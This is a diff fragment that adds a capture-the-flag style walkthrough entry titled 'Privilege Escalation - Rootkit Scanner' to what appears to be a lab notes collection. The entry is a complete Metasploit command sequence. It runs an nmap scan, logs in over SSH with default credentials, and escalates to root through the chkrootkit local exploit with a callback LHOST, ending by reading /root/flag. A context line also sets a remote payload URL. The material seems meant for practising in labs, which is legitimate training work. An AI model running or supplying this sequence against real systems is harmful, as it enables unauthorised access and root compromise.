@@ -1513,9 +1513,27 @@ set URL http://192.162.5.2/test.sh
 set SESSION 1
 run
 ```
+77)  Privilege Escalation - Rootkit Scanner
 
-
-
+```
+nmap -sS -sV 192.14.195.3
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.14.195.3
+set USERNAME jackie
+set PASSWORD password
+exploit
+sessions -i 1
+ps aux
+cat /bin/check-down
+​command -v chkrootkit
+/bin/chkrootkit -V
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set session 1
+set LHOST 192.14.195.2
+exploit
+cat /root/flag
+```
 
 
 
